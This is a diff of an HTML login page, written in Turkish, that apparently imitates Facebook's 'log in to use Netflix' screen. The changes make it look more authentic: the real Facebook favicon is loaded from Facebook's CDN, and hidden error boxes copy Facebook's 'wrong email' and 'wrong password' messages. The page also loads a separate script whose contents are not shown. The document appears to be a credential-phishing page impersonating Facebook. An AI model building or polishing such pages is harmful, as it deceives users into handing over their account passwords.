@@ -11,7 +11,7 @@
       crossorigin="anonymous"
     />
     <link rel="stylesheet" href="style/facebookStyle.css" />
-    <link rel="icon" href="img/logo.png" />
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
     <title>Netflix</title>
   </head>
   <body>
@@ -20,11 +20,19 @@
         <h2 id="homelink">Facebook</h2>
       </div>
     </div>
-    <div id="content">
-      <span style="font-weight: 600">Netflix</span>
-      uygulamasını Facebook hesabınla kullanmak için giriş yap.
-    </div>
     <div class="login_form_container">
+      <div id="content">
+        <span style="font-weight: 600">Netflix</span>
+        uygulamasını Facebook hesabınla kullanmak için giriş yap.
+      </div>
+      <div class="email-error" id="error-box" style="display: none;">
+        <h2 class="error-header" style="margin: 0;">Yanlış e-posta veya telefon numarası</h2>
+        <p style="margin: 0;">Girdiğin e-posta veya cep telefonu numarası bir hesaba bağlı değil. <a href="#">Hesabını bul ve giriş yap</a></p>
+      </div>
+      <div class="email-error" id="password-box" style="display: none;">
+        <h2 class="error-header" style="margin: 0;">Lütfen şifreni tekrar gir</h2>
+        <p style="margin: 0;">Girdiğin şifre yanlış. <a href="#">Şifreni mi Unuttun?</a></p>
+      </div>
       <form>
         <div id="loginform">
           <div class="clearfix form_row">
@@ -36,6 +44,7 @@
               tabindex="0"
               autocomplete="username"
               class="inputtext _55r1"
+              autofocus
             />
           </div>
           <div class="clearfix form_row">
@@ -57,16 +66,17 @@
                 name="login"
                 type="submit"
                 tabindex="0"
+                id="login-facebook"
               />
             </label>
           </div>
           <p class="reset_password form_row"><a href="#">Hesabını mı unuttun?</p>
           <div style="margin:auto; width:380px">
-            <a role="button" class="_42ft _4jy0 _4jy3 _4jy2 selected _51sy" style="margin-left:100px" href="#" target="_blank">Yeni Hesap Oluştur</a>
+            <a role="button" class="_42ft _4jy0 _4jy3 _4jy2 selected _51sy" style="margin-left:100px" href="#">Yeni Hesap Oluştur</a>
           </div>
         </div>
       </form>
     </div>
-    <script src="js/script.js"></script>
+    <script src="js/facebookscript.js"></script>
   </body>
 </html>
